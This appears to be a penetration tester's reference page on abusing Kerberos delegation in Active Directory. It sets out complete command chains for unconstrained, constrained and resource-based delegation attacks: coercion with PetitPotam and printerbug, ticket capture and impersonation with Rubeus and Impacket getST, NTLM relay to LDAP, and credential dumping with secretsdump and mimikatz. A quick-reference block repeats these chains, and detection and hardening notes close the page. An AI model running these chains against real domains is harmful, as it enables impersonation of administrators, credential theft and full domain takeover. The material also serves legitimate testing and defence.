+++
title = 'Kerberos Delegation'
date = 2026-10-30
type = 'notes'
weight = 40
toc = true
tags = ['active-directory', 'kerberos', 'delegation']
+++

Delegation lets a service act on behalf of a user to reach another service. Misconfigured delegation remains one of the most direct paths to Domain Admin: if you control a service trusted for delegation, you can impersonate any user — including administrators — to the delegated resource. The three classic models still define the attack surface, but 2025–2026 added new primitives around **coercion-to-relay-to-RBCD**, **cross-forest RBCD**, and **SPN-collision attacks (KerberLoss)** that change how you approach a modern environment.

There are three types to know for the OSCP and for real engagements:

| Type | Attribute / flag | Who can abuse it |
|---|---|---|
| **Unconstrained** | `TRUSTED_FOR_DELEGATION` (`userAccountControl` bit `0x80000`) | Anyone who compromises the host; it caches TGTs of every user who authenticates to it |
| **Constrained** | `msDS-AllowedToDelegateTo` | Anyone who controls the delegated account (password/hash), optionally with protocol transition |
| **Resource-based constrained (RBCD)** | `msDS-AllowedToActOnBehalfOfOtherIdentity` on the *target* | Anyone with write access to the target computer object plus a controlled machine account |

> **All delegation abuse requires Kerberos.** Keep your clock within 5 minutes of the DC (`sudo ntpdate <dc>` or `rdate -n <dc>`), use FQDNs, and export `KRB5CCNAME` after every `getST`.

---

## 1. Enumeration

### 1.1 PowerView (Windows)

```powershell
Import-Module .\PowerView.ps1
Get-DomainComputer -Unconstrained -Properties dnshostname,samaccountname
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth -Properties dnshostname,samaccountname,msds-allowedtodelegateto
```

### 1.2 Impacket (Linux) — `findDelegation.py`

```bash
impacket-findDelegation <domain>/<user>:<password> -dc-ip <dc-ip>
impacket-findDelegation <domain>/<user> -hashes :<ntlm> -dc-ip <dc-ip>
```

`findDelegation.py` lists **all three delegation types** in one pass — unconstrained, constrained, and RBCD — and is the most common Linux-side discovery script.

### 1.3 NetExec and LDAP

```bash
# NetExec — trusted for delegation
netexec ldap <dc-ip> -u <user> -p <pass> --trusted-for-delegation

# Raw LDAP — constrained delegation targets
# (filter: msDS-AllowedToDelegateTo=*)
```

### 1.4 BloodHound edges

BloodHound surfaces all three delegation types through built-in edges:

| Edge | Meaning |
|---|---|
| **`AllowedToDelegate`** | Constrained delegation trust (`msDS-AllowedToDelegateTo`) |
| **`AllowedToAct`** | RBCD trust — the target can act on behalf of the source |
| **`AddAllowedToAct`** | Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` — the RBCD **setup** primitive |

The pre-built queries **“Find Computers with Unconstrained Delegation”** and **“Find Delegation”** cover the first two; for RBCD, query the `AllowedToAct` and `AddAllowedToAct` edges directly:

```cypher
MATCH p=(u)-[:AllowedToAct]->(c) RETURN p
MATCH p=(u)-[:AddAllowedToAct]->(c) RETURN p
```

### 1.5 Rubeus `triage` and `dump`

```powershell
.\Rubeus.exe triage          # list all tickets in the current logon session
.\Rubeus.exe dump /luid:<LUID> /service:krbtgt
```

`triage` is the fastest way to see what tickets are already cached on a host — useful before deciding whether to coerce a new authentication or reuse an existing one.

---

## 2. Unconstrained Delegation

A host with unconstrained delegation receives a **forwardable TGT** for every user who authenticates to it and caches it in LSASS. Compromise the host, and you can extract those TGTs — or wait for a privileged account to connect.

### 2.1 Attack path

1. **Compromise a host with unconstrained delegation**, or find one you can write to.
2. **Get local admin/SYSTEM** on it and start a ticket monitor:

   ```powershell
   .\Rubeus.exe monitor /interval:5 /nowrap
   ```

3. **Coerce a Domain Controller** (or another privileged host) to authenticate to the delegated host:

   ```bash
   python3 PetitPotam.py <delegated-host-ip> <dc-ip>
   # or
   python3 printerbug.py <domain>/<user>:<password>@<delegated-host-ip> <attacker-listener>
   ```

4. **Rubeus captures the incoming `DC01$` TGT**. Inject it:

   ```powershell
   .\Rubeus.exe ptt /ticket:<base64-ticket>
   ```

5. **With the DC machine TGT**, DCSync:

   ```bash
   impacket-secretsdump -k -no-pass <domain>/DC01$@<dc-fqdn>
   ```

**Alternative — extract tickets already cached:** `mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"`, then `kerberos::ptt` a `.kirbi`.

> **Why it works:** `DC01$` is a domain principal with DCSync-like rights when used from the DC. A TGT for it is effectively Domain Admin. Coercion can be unauthenticated on older PetitPotam builds, or authenticated via `printerbug.py` / `dfscoerce.py` on patched systems.

### 2.2 2025–2026 refinement — coercion → relay

The classic coercion-and-capture path still works, but it is increasingly paired with **NTLM relay to LDAP** when the delegation host cannot be fully compromised first. If you can coerce authentication from a privileged host and relay it to LDAP(S), you can set RBCD on a target you control — without ever capturing a TGT. That chain is covered in Section 4.

---

## 3. Constrained Delegation (S4U2Self / S4U2Proxy)

The account has an explicit list in `msDS-AllowedToDelegateTo` (usually `cifs/<host>`, `http/<host>`, `mssql/<host>`). There are two variants:

| Variant | Behaviour |
|---|---|
| **With protocol transition** (`TRUSTED_TO_AUTH_FOR_DELEGATION`) | `S4U2Self` impersonates **any** user without their password; `S4U2Proxy` forwards the ticket to the allowed SPN |
| **Without protocol transition** | No `S4U2Self` — you must present a **forwardable service ticket** from the real user first |

### 3.1 Exploitation with protocol transition

```bash
# Impersonate administrator to the allowed SPN
impacket-getST -spn cifs/<target-fqdn> -impersonate administrator \
  <domain>/<delegated-user>:<password> -dc-ip <dc-ip>

export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass <target-fqdn>
# or
impacket-psexec -k -no-pass <target-fqdn>
```

**With Rubeus (Windows):**

```powershell
.\Rubeus.exe s4u /user:<delegated-user> /rc4:<ntlm-hash> \
  /impersonateuser:administrator /msdsspn:cifs/<target-fqdn> /ptt
```

### 3.2 SPN substitution (`/altservice`)

`/altservice:http,host` lets you reuse the same ticket for a different service class on the same host — useful when only `cifs` is allowed but you need `http`/`winrm`.

```powershell
.\Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator \
  /msdsspn:cifs/target.domain.local /altservice:http /ptt
```

### 3.3 Prerequisites and pitfalls

- **Protocol transition must be enabled** (`TRUSTED_TO_AUTH_FOR_DELEGATION`); without it, `S4U2Self` fails.
- **The delegated account needs an SPN** if it does not already have one — `addspn.py` can add a temporary SPN before the `s4u` request.
- **`impacket-getST` writes `<impersonated-user>.ccache`** in the current directory; export `KRB5CCNAME` to that path.
- **Without protocol transition**, you need a real forwardable service ticket from the target user before `S4U2Proxy` will succeed.

### 3.4 KerberLoss — CVE-2026-25177 (SPN collision in constrained delegation)

KerberLoss is an authenticated privilege-escalation flaw in AD DS caused by **inconsistent handling of comparison-ignorable Unicode characters in SPNs**. AD stores these characters verbatim but ignores them during name comparisons, so a crafted `servicePrincipalName` can bypass **SPN uniqueness** and **SPN-alias** protections.

| Property | Detail |
|---|---|
| **CVE** | CVE-2026-25177 |
| **Type** | SPN uniqueness bypass via Unicode normalisation |
| **Primitive** | SPN-jacking in **constrained-delegation** scenarios; forced Kerberos-to-NTLM downgrade |
| **Impact** | In suitable delegation configurations, privilege escalation toward **SYSTEM-level** access |
| **Patch** | March 10, 2026 Microsoft updates |

**Practical consequence for delegation abuse:** if you have `WriteProperty` on an account's `servicePrincipalName`, you can register a **Unicode-variant SPN** that the KDC treats as distinct from the legitimate one but that clients resolve to your account. In a constrained-delegation setup, that lets you **hijack the service identity** the delegation is pointed at — a stealthier alternative to classic SPN injection.

**Detection:** Event **5136** for `servicePrincipalName` changes containing invisible Unicode characters, especially from non-machine accounts.

### 3.5 CheckSum — CVE-2025-60704 (missing cryptographic step)

A **missing cryptographic step** in Windows Kerberos **protocol transition and constrained delegation**. It undermines the integrity check that should bind the S4U2Self ticket to the requesting service, weakening the delegation trust model. Patched November 2025. If the target is unpatched, this is a distinct constrained-delegation primitive from the classic `msDS-AllowedToDelegateTo` abuse.

---

## 4. Resource-Based Constrained Delegation (RBCD)

RBCD stores the delegation permission **on the target** (`msDS-AllowedToActOnBehalfOfOtherIdentity`). The resource decides who may delegate to it, rather than the domain. The attacker needs:

1. **Write access** to the target computer object (`GenericWrite`, `GenericAll`, `WriteDACL`, or ownership) — BloodHound edge **`AddAllowedToAct`**.
2. A **machine account you control** (create one if `ms-DS-MachineAccountQuota` > 0).
3. The target's SPN (e.g. `cifs/target.fqdn`).

### 4.1 Standard RBCD chain (Impacket)

```bash
# 1. Check MachineAccountQuota (default is 10)
Get-DomainObject -Identity "DC=<domain>,DC=<tld>" -Properties ms-ds-machineaccountquota
# or:
nxc ldap <dc-ip> -u <user> -p <password> --query "(&(objectClass=domain))" -attributes ms-ds-machineaccountquota

# 2. Create a controlled machine account
impacket-addcomputer <domain>/<user>:<password> -computer-name 'ATTACK$' \
  -computer-pass 'P@ssw0rd123!' -dc-ip <dc-ip>

# 3. Grant RBCD on the target
impacket-rbcd -delegate-from 'ATTACK$' -delegate-to 'TARGET$' -action write \
  -dc-ip <dc-ip> <domain>/<user>:<password>

# 4. Impersonate administrator to the target
impacket-getST -spn cifs/<target-fqdn> -impersonate administrator -dc-ip <dc-ip> \
  '<domain>/ATTACK$:P@ssw0rd123!'

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass <target-fqdn>

# 5. Clean up
impacket-rbcd -delegate-from 'ATTACK$' -delegate-to 'TARGET$' -action remove \
  -dc-ip <dc-ip> <domain>/<user>:<password>
```

**With bloodyAD:**

```bash
bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> add rbcd 'TARGET$' 'ATTACK$'
```

**With Rubeus (Windows):**

```powershell
.\Rubeus.exe s4u /user:ATTACK$ /rc4:<machine-ntlm> /impersonateuser:administrator \
  /msdsspn:cifs/<target-fqdn> /ptt
```

### 4.2 The modern chain — coercion → NTLM relay to LDAP → RBCD

This is the highest-value 2025–2026 RBCD path because it starts with **no credentials** and does not require compromising the delegation host first.

**High-level steps** (from the Black Hills “Drop the MIC” research):

1. Compromise **any** low-privileged user or machine in the domain.
2. Identify a DC vulnerable to **CVE-2019-1040 (Drop the MIC)** — bypasses SMB signing.
3. **Coerce a second DC** to authenticate to the attacker (`PetitPotam`, `printerbug`, `dfscoerce`).
4. **Drop the MIC** and relay the authentication to **LDAP(S)** on the vulnerable DC.
5. Over the relayed LDAP session, **add a machine account** via Machine Account Quota.
6. Over the same session, **set RBCD** to trust that machine account for delegation.
7. Use `getST` to impersonate `administrator` to the target, then `psexec` / `secretsdump`.

```bash
# Conceptual flow
impacket-ntlmrelayx.py -t ldaps://<vulnerable-dc> --remove-mic --delegate-access \
  -smb2support
python3 PetitPotam.py <attacker-ip> <second-dc-ip>
```

The **`--delegate-access`** flag tells `ntlmrelayx` to create a machine account and set RBCD on the relayed target in one step.

> **Why this matters:** the relay-to-LDAP path turns **coercion** into **RBCD setup** without ever cracking a hash or compromising a host. It is the “no-creds to DA” chain that modern BloodHound paths model through `CoerceAndRelayNTLMToLDAPS` and `AddAllowedToAct`.

### 4.3 Cross-domain and cross-forest RBCD

RBCD is not limited to a single domain. Synacktiv’s 2026 research documents a **cross-domain and cross-forest RBCD workflow**, including an Impacket script implementation for carrying out the attack across trust boundaries.

The primitive is the same — write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer in **another domain** — but the S4U2Self/S4U2Proxy tickets must be requested against the **target domain’s** KDC, and the controlled machine account must be reachable across the trust. In practice, this means:

- The controlled machine account is in **your** domain.
- The target computer object is in **their** domain.
- The `getST` call uses `-dc-ip <target-domain-dc>` and the target’s SPN.
- The final ticket is presented to the **target** service, not the source domain.

This extends RBCD from an intra-domain escalation to a **trust-boundary crossing** primitive — a significant change from the classic single-domain model.

### 4.4 RBCD pitfalls

- **`-delegate-to` needs the computer name with `$`**, not the FQDN; `-delegate-from` is your controlled account.
- **If `MachineAccountQuota` is `0`**, you need an existing machine account you control, or a different primitive.
- **The controlled account must have an SPN**; `addcomputer` creates one (`HOST/ATTACK$`), which is enough.
- **RBCD is a write** to the target, so it is often possible with `GenericWrite` from an ACL edge that would not otherwise give code execution.
- **Cross-forest RBCD requires the target domain’s KDC** for `getST` — do not point it at your own DC.

### 4.5 dMSA and CVE-2025-53779

**Delegated Managed Service Accounts (dMSA)** are a newer account type that can be abused for delegation. CVE-2025-53779 is a **relative path traversal** in Windows Kerberos that lets an authorized attacker abuse dMSA to elevate privileges over the network — potentially to **Domain Admin**. This is a delegation-adjacent primitive rather than a classic `msDS-AllowedToDelegateTo` misconfiguration, but it belongs in the same section because it abuses the delegation trust model. Patched in the August 2025 updates.

---

## 5. Quick Reference

```bash
# Enumerate all delegation types
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <dc>

# Unconstrained — monitor for TGTs, then coerce
.\Rubeus.exe monitor /interval:5 /nowrap
python3 PetitPotam.py <delegated-host> <dc-ip>

# Constrained — impersonate administrator
impacket-getST -spn cifs/<target> -impersonate administrator \
  <domain>/<svc>:<pass> -dc-ip <dc>

# RBCD — create, set, impersonate
impacket-addcomputer <domain>/<user>:<pass> -computer-name 'ATTACK$' \
  -computer-pass 'Pass123!' -dc-ip <dc>
impacket-rbcd -delegate-from 'ATTACK$' -delegate-to 'TARGET$' -action write \
  -dc-ip <dc> <domain>/<user>:<pass>
impacket-getST -spn cifs/<target> -impersonate administrator -dc-ip <dc> \
  '<domain>/ATTACK$:Pass123!'

# Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass <target>
```

---

## 6. Detection and Hardening Notes

| Attack | Telemetry |
|---|---|
| **Unconstrained TGT capture** | Coercion attempts (Spooler/EFSRPC); `Rubeus monitor` creates a visible process on the delegation host |
| **Constrained S4U** | **4769** with `Transited Services` populated; requester ≠ subject |
| **RBCD write** | **5136** on `msDS-AllowedToActOnBehalfOfOtherIdentity`; machine account creation (**4741**) just before the write |
| **KerberLoss** | **5136** on `servicePrincipalName` containing invisible Unicode characters |
| **Relay-to-LDAP RBCD** | LDAP write from a non-DC source; NTLM authentication to LDAP(S) from a coerced host |

**Hardening:**

- Remove **unconstrained delegation** from everything except DCs; mark privileged accounts **“sensitive and cannot be delegated”** or add them to **Protected Users**.
- Set **`ms-DS-MachineAccountQuota` to 0** where operationally possible — this closes the add-computer step in the RBCD chain.
- Enforce **LDAP signing and channel binding** to block relay-to-LDAP.
- Patch **CVE-2019-1040**, **CVE-2025-60704**, **CVE-2025-53779**, and **CVE-2026-25177**.
- Monitor **5136** for delegation-attribute changes and Unicode-variant SPNs.
- Disable the **Print Spooler** on DCs to remove the PrinterBug coercion surface.

---

## 7. Field Notes

- **RBCD is the most common modern delegation path**, because it needs only write access to a computer object — a far lower bar than compromising a delegation-enabled service.
- **The coercion → relay → RBCD chain is the “no-creds” version.** If you can coerce a DC and relay to LDAP(S), you can set RBCD without cracking anything.
- **Constrained delegation without protocol transition still needs a real forwardable ticket.** Do not assume `S4U2Self` works just because `msDS-AllowedToDelegateTo` is set.
- **`/altservice` is the SPN-substitution trick.** One allowed `cifs` SPN can pivot to `http`/`winrm` on the same host.
- **KerberLoss (CVE-2026-25177) is a delegation-adjacent SPN collision.** It matters most when you have `WriteProperty` on `servicePrincipalName` and the target uses constrained delegation.
- **Cross-forest RBCD changes the trust model.** The target domain’s KDC must issue the ticket — pointing `getST` at your own DC will fail.
- **Patch level matters.** Check for CVE-2025-60704, CVE-2025-53779, and CVE-2026-25177 before assuming a delegation misconfiguration is the only path.

This file sits alongside the **Domain Trusts** and **ACL Enumeration** notes: RBCD is often reached through an ACL edge (`AddAllowedToAct`), and cross-forest RBCD is the delegation counterpart to cross-forest SID-history abuse.
